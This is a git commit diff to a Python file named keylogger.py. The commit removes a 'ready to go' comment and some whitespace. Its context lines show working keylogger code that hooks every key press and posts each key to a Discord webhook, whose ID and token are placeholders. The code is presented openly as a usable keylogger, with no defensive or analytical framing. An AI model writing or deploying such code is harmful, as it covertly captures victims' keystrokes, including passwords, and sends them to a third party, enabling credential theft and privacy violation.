c5a56ceefaf242f434d0a844f700ab2c0e00c319
Dilipkumar Choudhary <161207606+dilipk5@users.noreply.github.com>
2024-09-29 12:21:11 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -3,15 +3,12 @@ import requests
 
 url = "https://discord.com/api/webhooks/your-webhook-id/your-webhook-token"
 
-#********************AND YOU ARE READY TO GO********************#
-
 def on_key_press(event):
     data = {
     "content":event.name
     }
     requests.post(url=url, data=data)
-    
-    
+        
 keyboard.on_press(on_key_press)
 keyboard.wait()
 
